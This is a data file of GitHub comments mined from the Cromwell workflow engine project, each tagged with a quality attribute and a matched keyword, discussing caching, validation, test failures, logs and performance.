~[cromwell.jar:0.1,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:8544,secur,security,8544,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['secur'],['security']
Security,"~~@ruchim writing a cache result (its hashes and its results) should be functionally atomic (i.e. either you get a cache hit, or you don't, and if you do, then you can copy all the results immediately).; If that's not part of this PR then it should 100% be part of Cromwell 27 (IMO)~~. Oops, I misread. You're talking about cache hit vs cache miss in the metadata if copying results fails? If the metadata is overwriting itself then ""current state of play"" is probably ok?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2243#issuecomment-300173806:38,hash,hashes,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2243#issuecomment-300173806,1,['hash'],['hashes']
Security,"~~The CGA ""CPU WDL"" validates pretty quickly. With 10,000 requests at a concurrency of 20, the 99% latency is just 249 ms~~. This was actually not doing exactly what I expected: it was failing to parse. At least we know parsing attempts are fast!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4573#issuecomment-458340134:20,validat,validates,20,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4573#issuecomment-458340134,1,['validat'],['validates']
Security,👍 . Once the dust settles w/ PBE I think we should go back and abstract common validation patterns which might exist across the backends into some place of optional utility functions for other backend implementers but that's not for now IMO. [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/746/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/746#issuecomment-215549418:79,validat,validation,79,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/746#issuecomment-215549418,1,['validat'],['validation']
Security,👍 with a ticket to not forget about slow failing validation. [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/708/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/708#issuecomment-212986086:49,validat,validation,49,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/708#issuecomment-212986086,1,['validat'],['validation']
Testability," ""config__algorithm__tools_off"": [],; ""genome_resources__rnaseq__transcripts"": {; ""nameext"": "".gtf"",; ""location"": ""/cromwell_root/tj-bcbio-papi/main-rnaseq.cwl/6c75cc7c-5515-45e0-9e5b-9a1b9e6fd2e1/call-qc_to_rec/bcbiodata/test_bcbio_cwl/testdata/genomes/hg19/rnaseq/ref-transcripts.gtf"",; ""path"": ""/cromwell_root/tj-bcbio-papi/main-rnaseq.cwl/6c75cc7c-5515-45e0-9e5b-9a1b9e6fd2e1/call-qc_to_rec/bcbiodata/test_bcbio_cwl/testdata/genomes/hg19/rnaseq/ref-transcripts.gtf"",; ""size"": 15149,; ""dirname"": ""/cromwell_root/tj-bcbio-papi/main-rnaseq.cwl/6c75cc7c-5515-45e0-9e5b-9a1b9e6fd2e1/call-qc_to_rec/bcbiodata/test_bcbio_cwl/testdata/genomes/hg19/rnaseq"",; ""secondaryFiles"": [; {; ""nameext"": "".db"",; ""location"": ""/cromwell_root/tj-bcbio-papi/main-rnaseq.cwl/6c75cc7c-5515-45e0-9e5b-9a1b9e6fd2e1/call-qc_to_rec/bcbiodata/test_bcbio_cwl/testdata/genomes/hg19/rnaseq/ref-transcripts.gtf.db"",; ""path"": ""/cromwell_root/tj-bcbio-papi/main-rnaseq.cwl/6c75cc7c-5515-45e0-9e5b-9a1b9e6fd2e1/call-qc_to_rec/bcbiodata/test_bcbio_cwl/testdata/genomes/hg19/rnaseq/ref-transcripts.gtf.db"",; ""dirname"": ""/cromwell_root/tj-bcbio-papi/main-rnaseq.cwl/6c75cc7c-5515-45e0-9e5b-9a1b9e6fd2e1/call-qc_to_rec/bcbiodata/test_bcbio_cwl/testdata/genomes/hg19/rnaseq"",; ""secondaryFiles"": [],; ""basename"": ""ref-transcripts.gtf.db"",; ""class"": ""File"",; ""nameroot"": ""ref-transcripts.gtf""; }; ],; ""basename"": ""ref-transcripts.gtf"",; ""class"": ""File"",; ""nameroot"": ""ref-transcripts""; },; ""reference__fasta__base"": {; ""nameext"": "".fa"",; ""location"": ""/cromwell_root/tj-bcbio-papi/main-rnaseq.cwl/6c75cc7c-5515-45e0-9e5b-9a1b9e6fd2e1/call-qc_to_rec/bcbiodata/test_bcbio_cwl/testdata/genomes/hg19/seq/hg19.fa"",; ""path"": ""/cromwell_root/tj-bcbio-papi/main-rnaseq.cwl/6c75cc7c-5515-45e0-9e5b-9a1b9e6fd2e1/call-qc_to_rec/bcbiodata/test_bcbio_cwl/testdata/genomes/hg19/seq/hg19.fa"",; ""size"": 37196,; ""dirname"": ""/cromwell_root/tj-bcbio-papi/main-rnaseq.cwl/6c75cc7c-5515-45e0-9e5b-9a1b9e6fd2e1/call-qc_to_rec/bcbiodata/test_bcbio_cwl/testdata/gen",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3724#issuecomment-436054277:8957,test,testdata,8957,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3724#issuecomment-436054277,1,['test'],['testdata']
Testability, ''; inputs:; VEP_File-0: gs://firecloud-tcga-open-access/tutorial/reference/my_dot_vep.zip; __extra_config_gcs_path: gs://cromwell-auth-broad-firecloud-benchmark/04b3f189-18f3-47b3-972c-0e59d2a56174_auth.json; exec: gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/exec.sh; mutectMergedRawVCF-0: gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-GatherAndOncotate_Task/MuTect1.call_stats.vcf; labels: {}; logging:; gcsPath: gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/VEP_Task.log; outputs:; VEP_Task-rc.txt: gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/VEP_Task-rc.txt; df.log.txt: gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/df.log.txt; dstat.log.txt: gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/dstat.log.txt; variant_effect_output.txt: gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/variant_effect_output.txt; variant_effect_output.txt_summary.html: gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/variant_effect_output.txt_summary.html; projectId: broad-firecloud-benchmark; resources:; bootDiskSizeGb: 0; disks: []; minimumCpuCores: 0; minimumRamGb: 0; noAddress: false; preemptible: false; zones: []; serviceAccount:; email: default,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1860#issuecomment-273271145:4710,log,log,4710,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1860#issuecomment-273271145,1,['log'],['log']
Testability," (in MB).; ![memory-v1-v1s](https://user-images.githubusercontent.com/2978948/48013920-818d5c80-e0f3-11e8-9f71-d4dedcbb2ba1.png). The graph below shows the average response time of the metadata endpoint with and without streaming (in ms).; ![metadata-200-v1-v1s](https://user-images.githubusercontent.com/2978948/48013852-53a81800-e0f3-11e8-9152-6c844e896b09.png). A plausible explanation of the response time increase is that the connection to the DB needs to remain open (and can't be re-used) for as long as the stream is not closed. This includes time spent pulling data out of the database AND building the JSON.; Whereas in the non streaming version, the connection can be re-used for another query as soon as all the data has been pulled and Cromwell is building the metadata. The extra time spent with the connection used in the streaming version can then delay subsequent requests when lots of metadata requests are being made.; We also see that the graph spans longer on the X axis for the streaming version, which means the test took longer to complete. [The test](https://github.com/broadinstitute/cromwell/blob/tj-metadata-stream-experiment-2/scripts/perf/test_cases/metadata_load/metadata_load.wdl) consists of sending a lot of metadata requests to Cromwell. ### Thoughts, possible next steps and/or things to try. - I think the fs2 stream model is still interesting as it allows for a clean interruption of building of the metadata (with or without streaming from the database).; - It might be possible to choose between streaming and non streaming depending on the size of the metadata to build (would require a COUNT(*) beforehand); - It might be possible to order the database request (for instance if the query was sorted by call fqn, metadata key and timestamp) in such a way that the json can be built:; 1) Directly, i.e without need for the wrapping MetadataComponent object to maintain information about indices in the list and CRDT (which would reuse memory usage and possible",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4124#issuecomment-435955806:3852,test,test,3852,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4124#issuecomment-435955806,1,['test'],['test']
Testability," / merge this despite a test failure during one run since I think that failure was due to unrelated Docker pull issues. So one build for this branch failed:. https://travis-ci.org/broadinstitute/cromwell/builds/113532462. The first failure was a docker test, and looking at this more closely something seems to have gone awry pulling the Docker image. Our build scripts should pre-pull `ubuntu:latest` and normally this takes about 10 seconds and produces a nice success message. In this run the Docker image pull took more than 43 seconds and the success message appears to be cut off:. ```; Pulling repository docker.io/library/ubuntu; age for ubuntu:latest; ```. The Docker test looks like it's going fine until it's time to actually run a call, at which point there are no log messages for 16 seconds, and when the log message does arrive it seems to indicate a timeout:. ```; [INFO] [03/03/2016 23:43:02.128] [test-system-akka.actor.default-dispatcher-2] [WorkflowActor(akka://test-system)] WorkflowActor [UUID(299b2fc4)]: persisting status of a to Starting.; [WARN] [03/03/2016 23:43:18.664] [test-system-akka.actor.default-dispatcher-4] [akka://test-system/system/IO-TCP/selectors/$a/1] received dead letter from Actor[akka://test-system/user/IO-HTTP/group-0/1#-1001288108]: Write(ByteString(),spray.io.SslTlsSupport$WriteChunkAck$@22a4ed01); ```. There's another 13 second hang shortly thereafter:. ```; [INFO] [03/03/2016 23:43:19.002] [test-system-akka.actor.default-dispatcher-10] [WorkflowActor(akka://test-system)] WorkflowActor [UUID(299b2fc4)]: persisting status of a to Running.; [INFO] [03/03/2016 23:43:32.134] [pool-7-thread-13-ScalaTest-running-CallCachingWorkflowSpec] [akka://test-system/user/$$h] WorkflowManagerActor submitWorkflow input id = None, effective id = c21e652b-b5f0-4435-a390-b1d61d1c9b4a; ```. Next it looks like a test is started up while pointing to the same in-memory db as this paused workflow. The paused workflow is interpreted as a workflow needing restart,",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/502#issuecomment-192361344:1015,test,test-system,1015,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/502#issuecomment-192361344,2,['test'],['test-system']
Testability," > Peter van 't Hof @ffinfo Aug 26 19:28; > when using qstat i would use it only once for the complete pool instead executing it for each job; > so then you get an output like this:; > `; > job-ID prior name user state submit/start at queue slots ja-task-ID; > 9923549 0.00000 cromwell_1 pjvan_thof qw 08/26/2016 17:23:16 1; > 9923550 0.00000 cromwell_1 pjvan_thof qw 08/26/2016 17:23:16 1; > `; > this is only 2 jobs but having a lot of jobs this will reduce the load a lot; > ; > kshakir @kshakir Aug 26 21:21; > True, Cromwell will end up in an endless loop if someone terminates the SGE job, or if the rc file doesn’t appear in general. One could use isAlive intermittently, but it was introduced mainly for recovering jobs at re-startup, & I would not have isAlive poll as often as we check for the rc file. Btw, GATK Queue actually only checks drmaa every 30 seconds, so that it doesn’t overload dispatchers. Something like isAlive could be checked with similar frequency. All this is a bigger discussion that could be tracked in a git issue.; > Separately, I am hearing from multiple people that the rc poll logs are spam. ; > ; > Peter van 't Hof @ffinfo Aug 26 21:44; > As already suggested in the PR, a actor pool would be better I think but that's not a small change indeed; > mostly jobs are running way longer that 10 or 30 sec does not matter a lot ; > ; > Peter van 't Hof @ffinfo Aug 26 21:50; > On our cluster we need something like retries but if it goes to an endless loop he will never retry. In it's current state it's for us not yet usable but If you open to it I can think/test things then there is a improvement on this. I can even try to get some time to do some developing but that I can't promise directly. I can try to look into a lfs.drama backend. If it's possible to check running jobs after restart this would be nice to have, but need to look into this. What to do with this PR i leave up to you guys, merging it or not does not really matter for me at this point ;).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-242961348:1859,log,logs,1859,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-242961348,4,"['log', 'test']","['logs', 'test']"
Testability," And my outputs after running with the input array with `[1,2,3,4,5,6,7,8,9]` are the following:. ```json; {; ""outputs"": {; ""TestWorkflow.final_out"": [{; ""right"": [""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-GenerateMap/execution/10.txt"", ""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-0/execution/10.txt.copy""],; ""left"": 1; }, {; ""left"": 2,; ""right"": [""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-GenerateMap/execution/4.txt"", ""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-1/execution/4.txt.copy""]; }, {; ""left"": 3,; ""right"": [""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-GenerateMap/execution/6.txt"", ""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-2/execution/6.txt.copy""]; }, {; ""left"": 4,; ""right"": [""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-GenerateMap/execution/7.txt"", ""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-3/execution/7.txt.copy""]; }, {; ""right"": [""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-GenerateMap/execution/1.txt"", ""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-4/execution/1.txt.copy""],; ""left"": 5; }, {; ""left"": 6,; ""right"": [""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-GenerateMap/execution/3.txt"", ""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-5/execution",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3314#issuecomment-368445779:1771,test,test-cromwell-map,1771,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3314#issuecomment-368445779,2,"['Test', 'test']","['TestWorkflow', 'test-cromwell-map']"
Testability," In the; * second Javascript call we only get a non-null result when the key is explicitly cast to a string.; */; private static void testKeyCastExplicit() throws ScriptException {; final String expr1 = expr(; ""var obj = {};"",; ""obj[true] = 'world';"",; ""print('testKeyCastExplicit hello init ' + obj[true]);"",; ""obj;""; );; final Map<String, Object> args1 = Collections.emptyMap();; final JSObject result1 = (JSObject) eval(expr1, args1);. final String expr2 = expr(""print('testKeyCastExplicit hello again ' + obj[true.toString()]);"");; final Map<String, Object> args2 = Collections.singletonMap(""obj"", result1);; eval(expr2, args2);; }. /**; * Show that keys do not coerce to a string in a java.util.Map.; */; private static void testKeyMapString() throws ScriptException {; /*; See notes in testKeyCastImplicit regarding keys should be cast to strings. Because ECMA says that keys are strings, this lookup should work but doesn't.; */; final String expr = expr(; ""print('testKeyMapString hello ' + obj[true]);"",; ""obj;""; );; final Map<String, Object> obj = Collections.singletonMap(""true"", ""world"");; final Map<String, Object> args = Collections.singletonMap(""obj"", obj);; eval(expr, args);; }. /**; * Show that key equality works for non-strings in a java.util.Map.; */; private static void testKeyMapNonString() throws ScriptException {; /*; See notes in testKeyCastImplicit regarding keys should be cast to strings. Keys are not coerced to strings upon lookup nor internally, meaning we actually get a match on a Map with; non-string keys. Ideally instead of passing the lookup directly to java.util.Map.get() a coerced string should be passed. However; if the lookup keys are going to be coerced, the map's keys should have already been coerced also. The internal; map must contain string keys anyway to be ECMA compliant. Thus a java.util.Map<Object, Object> should be; converted to a Map<String, Object> where the keys are coerced to strings. Ideally this test should still work; after any fix ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3090#issuecomment-355634573:4764,test,testKeyMapString,4764,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3090#issuecomment-355634573,1,['test'],['testKeyMapString']
Testability," [warn] SingleWorkflowRunnerActor: received unexpected message: Done in state RunningSwraData; [2018-11-21 15:09:06,80] [info] MaterializeWorkflowDescriptorActor [02306258]: Parsing workflow as WDL draft-2; [2018-11-21 15:09:07,34] [info] MaterializeWorkflowDescriptorActor [02306258]: Call-to-Backend assignments: test.hello -> AWSBATCH; [2018-11-21 15:09:08,72] [info] WorkflowExecutionActor-02306258-436a-4372-ab54-2dcd83c42b47 [02306258]: Starting test.hello; [2018-11-21 15:09:10,76] [info] AwsBatchAsyncBackendJobExecutionActor [02306258test.hello:NA:1]: echo 'Hello World!' > ""helloWorld.txt""; [2018-11-21 15:09:10,80] [info] Submitting job to AWS Batch; [2018-11-21 15:09:10,80] [info] dockerImage: ubuntu:latest; [2018-11-21 15:09:10,80] [info] jobQueueArn: arn:aws:batch:us-east-1:267795504649:job-queue/GenomicsHighPriorityQue-ae4256f76f07d96; [2018-11-21 15:09:10,80] [info] taskId: test.hello-None-1; [2018-11-21 15:09:10,80] [info] hostpath root: test/hello/02306258-436a-4372-ab54-2dcd83c42b47/None/1; [2018-11-21 15:09:14,56] [info] AwsBatchAsyncBackendJobExecutionActor [02306258test.hello:NA:1]: job id: 77106e8d-c518-4c0d-82e9-3f23e1f07040; [2018-11-21 15:09:14,62] [info] AwsBatchAsyncBackendJobExecutionActor [02306258test.hello:NA:1]: Status change from - to Running; [2018-11-21 15:09:37,18] [info] AwsBatchAsyncBackendJobExecutionActor [02306258test.hello:NA:1]: Status change from Running to Succeeded; [2018-11-21 15:09:39,33] [info] WorkflowExecutionActor-02306258-436a-4372-ab54-2dcd83c42b47 [02306258]: Workflow test complete. Final Outputs:; {; ""test.hello.response"": ""s3://s4-somaticgenomicsrd-valinor/cromwell-execution/test/02306258-436a-4372-ab54-2dcd83c42b47/call-hello/helloWorld.txt""; }; [2018-11-21 15:09:39,37] [info] WorkflowManagerActor WorkflowActor-02306258-436a-4372-ab54-2dcd83c42b47 is in a terminal state: WorkflowSucceededState; [2018-11-21 15:09:43,77] [info] SingleWorkflowRunnerActor workflow finished with status 'Succeeded'.; {; ""outputs"": {; ""test",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440793421:3353,test,test,3353,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440793421,1,['test'],['test']
Testability," `CollectSequencingArtifactMetrics` stage) I'm re-pasting the whole error ( as I previously split it out into two) for clarification. ```; [2018-11-02 17:24:33,42] [info] AwsBatchAsyncBackendJobExecutionActor [1651349bSomaticSNVInDel.FilterByOrientationBias:1:1]: gatk FilterByOrientationBias \; \; -V /cromwell_root/s4-somaticgenomicsrd-valinor/JL027/Tigris-1.1.0.dev1/tigris_workflow/5c8ee2ab-f1bd-4c6c-ad0b-4af7b52d29f1/call-SomaticSNVInDel/vc.SomaticSNVInDel/1651349b-2144-4e0f-ab6e-2aeb7e96c760/call-Mutect2_First_Filter/shard-1/JL027_Tumor-JL027_Normal.mutect2.oncefiltered.vcf.gz \; -O JL027_Tumor-JL027_Normal.mutect2.twicefiltered.vcf.gz \; -P /cromwell_root/s4-somaticgenomicsrd-valinor/JL027/Tigris-1.1.0.dev1/tigris_workflow/5c8ee2ab-f1bd-4c6c-ad0b-4af7b52d29f1/call-SomaticSNVInDel/vc.SomaticSNVInDel/1651349b-2144-4e0f-ab6e-2aeb7e96c760/call-CollectSequencingArtifactMetrics/shard-1/JL027_Tumor.dedup.recal.artifactmetrics.pre_adapter_detail_metrics.txt \; -R /cromwell_root/s4-somaticgenomicsrd-benchmark-gatk4/database/1.0/ucsc.hg19.fasta \; -L /cromwell_root/s4-somaticgenomicsrd-benchmark-gatk4/database/1.0/SureSelect.hg19.regions.v5.interval_list \; -AM G/T -AM C/T \; [2018-11-02 17:24:33,44] [error] Absolute path /s4-somaticgenomicsrd-valinor/JL027/Tigris-1.1.0.dev1/tigris_workflow/5c8ee2ab-f1bd-4c6c-ad0b-4af7b52d29f1/call-SomaticSNVInDel/vc.SomaticSNVInDel/1651349b-2144-4e0f-ab6e-2aeb7e96c760/call-CollectSequencingArtifactMetrics/shard-1/JL027_Tumor.dedup.recal.artifactmetrics.pre_adapter_detail_metrics.txt doesn't appear to be under any mount points: local-disk /cromwell_root; java.lang.Exception: Absolute path /s4-somaticgenomicsrd-valinor/JL027/Tigris-1.1.0.dev1/tigris_workflow/5c8ee2ab-f1bd-4c6c-ad0b-4af7b52d29f1/call-SomaticSNVInDel/vc.SomaticSNVInDel/1651349b-2144-4e0f-ab6e-2aeb7e96c760/call-CollectSequencingArtifactMetrics/shard-1/JL027_Tumor.dedup.recal.artifactmetrics.pre_adapter_detail_metrics.txt doesn't appear to be under any mount points: local-disk ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4356#issuecomment-436327225:1272,benchmark,benchmark-,1272,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4356#issuecomment-436327225,1,['benchmark'],['benchmark-']
Testability," actually run a call, at which point there are no log messages for 16 seconds, and when the log message does arrive it seems to indicate a timeout:. ```; [INFO] [03/03/2016 23:43:02.128] [test-system-akka.actor.default-dispatcher-2] [WorkflowActor(akka://test-system)] WorkflowActor [UUID(299b2fc4)]: persisting status of a to Starting.; [WARN] [03/03/2016 23:43:18.664] [test-system-akka.actor.default-dispatcher-4] [akka://test-system/system/IO-TCP/selectors/$a/1] received dead letter from Actor[akka://test-system/user/IO-HTTP/group-0/1#-1001288108]: Write(ByteString(),spray.io.SslTlsSupport$WriteChunkAck$@22a4ed01); ```. There's another 13 second hang shortly thereafter:. ```; [INFO] [03/03/2016 23:43:19.002] [test-system-akka.actor.default-dispatcher-10] [WorkflowActor(akka://test-system)] WorkflowActor [UUID(299b2fc4)]: persisting status of a to Running.; [INFO] [03/03/2016 23:43:32.134] [pool-7-thread-13-ScalaTest-running-CallCachingWorkflowSpec] [akka://test-system/user/$$h] WorkflowManagerActor submitWorkflow input id = None, effective id = c21e652b-b5f0-4435-a390-b1d61d1c9b4a; ```. Next it looks like a test is started up while pointing to the same in-memory db as this paused workflow. The paused workflow is interpreted as a workflow needing restart, so another concurrent copy is launched. . ```; [INFO] [03/03/2016 23:43:32.139] [ForkJoinPool-3-worker-3] [akka://test-system/user/$$h] WorkflowManagerActor Found 1 workflow to restart.; [INFO] [03/03/2016 23:43:32.139] [ForkJoinPool-3-worker-3] [akka://test-system/user/$$h] WorkflowManagerActor Restarting workflow ID: 299b2fc4-6a26-462f-96e3-1281f172d197; [INFO] [03/03/2016 23:43:32.152] [ForkJoinPool-3-worker-3] [akka://test-system/user/$$h] Invoking restartableWorkflow on 299b2fc4; [INFO] [03/03/2016 23:43:32.153] [ForkJoinPool-3-worker-3] [akka://test-system/user/$$h] WorkflowManagerActor submitWorkflow input id = Some(299b2fc4-6a26-462f-96e3-1281f172d197), effective id = 299b2fc4-6a26-462f-96e3-1281f172d197; ``",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/502#issuecomment-192361344:1731,test,test-system,1731,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/502#issuecomment-192361344,2,['test'],['test-system']
Testability," as a last resort to increase the disk given to every task in case of ill behaving data; Int? emergency_extra_disk. # These are multipliers to multipler inputs by to make sure we have enough disk to accommodate for possible output sizes; # Large is for Bams/WGS vcfs; # Small is for metrics/other vcfs; Float large_input_to_output_multiplier = 2.25; Float small_input_to_output_multiplier = 2.0; Float cram_to_bam_multiplier = 6.0; }. Int preemptible_or_default = 2; Int max_retries_or_default = 2. # Disk sizes used for dynamic sizing; Int ref_size = 10; Int tumor_only_reads_size = 10; Int tumor_reads_size = tumor_only_reads_size + 1; Int gnomad_vcf_size = 1; Int normal_reads_size = 1. # If no tar is provided, the task downloads one from broads ftp server; Int funco_tar_size = 100; Int gatk_override_size = 0. # This is added to every task as padding, should increase if systematically you need more disk for every call; Int disk_pad = 10 + gatk_override_size . # logic about output file names -- these are the names *without* .vcf extensions; String output_basename = ""SRR2619134"" #hacky way to strip either .bam or .cram; String output_fullname = ""SRR2619134""; . Int tumor_cram_to_bam_disk = 10; Int normal_cram_to_bam_disk = 10. ; # assume alignment file without suffix is bam; # rename and index bam files without .bam suffix. call renameBamIndex {; input:; name = output_basename,; bam = tumor_reads,; disk_size = tumor_cram_to_bam_disk,. }; . output {; File filtered_vcf = renameBamIndex.output_bam; }; }. task renameBamIndex {; input {; String name; File bam; Int disk_size; Int? mem; String? sra; File? ngc; }; ; Int machine_mem = if defined(mem) then mem * 1000 else 6000; ; command {; echo ~{bam}; cp ~{bam} ~{name}.bam; cp /cromwell_root/~{name}/~{name} ~{name}.bam. samtools index -b ~{name}.bam; cp ~{name}.bam.bai ~{name}.bai; }; runtime {; docker: ""us.gcr.io/broad-gotc-prod/genomes-in-the-cloud:2.3.3-1513176735""; memory: machine_mem + "" MB""; disks: ""local-disk "" + disk_size + """,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5804#issuecomment-682146161:1333,log,logic,1333,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5804#issuecomment-682146161,1,['log'],['logic']
Testability," assertion failed: received unexpected message RealMessage(ServiceUnreachable,TestActor[akka://TestSystem-78f39f37-cc73-481d-8e7a-e59e623aa020/user/$$i]) after 0 millis; at akka.testkit.TestKitBase.expectNoMsg_internal(TestKit.scala:696); at akka.testkit.TestKitBase.expectNoMessage(TestKit.scala:661); at akka.testkit.TestKitBase.expectNoMessage$(TestKit.scala:660); at akka.testkit.TestKit.expectNoMessage(TestKit.scala:896); at cromwell.core.actor.RobustClientHelperSpec.$anonfun$new$7(RobustClientHelperSpec.scala:140); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at org.scalatest.OutcomeOf.outcomeOf(OutcomeOf.scala:85); at org.scalatest.OutcomeOf.outcomeOf$(OutcomeOf.scala:83); at org.scalatest.OutcomeOf$.outcomeOf(OutcomeOf.scala:104); at org.scalatest.Transformer.apply(Transformer.scala:22); at org.scalatest.Transformer.apply(Transformer.scala:20); at org.scalatest.FlatSpecLike$$anon$1.apply(FlatSpecLike.scala:1682); at org.scalatest.TestSuite.withFixture(TestSuite.scala:196); at org.scalatest.TestSuite.withFixture$(TestSuite.scala:195); at cromwell.core.actor.RobustClientHelperSpec.withFixture(RobustClientHelperSpec.scala:14); at org.scalatest.FlatSpecLike.invokeWithFixture$1(FlatSpecLike.scala:1680); at org.scalatest.FlatSpecLike.$anonfun$runTest$1(FlatSpecLike.scala:1692); at org.scalatest.SuperEngine.runTestImpl(Engine.scala:289); at org.scalatest.FlatSpecLike.runTest(FlatSpecLike.scala:1692); at org.scalatest.FlatSpecLike.runTest$(FlatSpecLike.scala:1674); at cromwell.core.actor.RobustClientHelperSpec.runTest(RobustClientHelperSpec.scala:14); at org.scalatest.FlatSpecLike.$anonfun$runTests$1(FlatSpecLike.scala:1750); at org.scalatest.SuperEngine.$anonfun$runTestsInBranch$1(Engine.scala:396); at scala.collection.immutable.List.foreach(List.scala:389); at org.scalatest.SuperEngine.traverseSubNodes$1(Engine.scala:384); at org.scalatest.SuperEngine.runTestsInBranch(Engine.scala:373); at 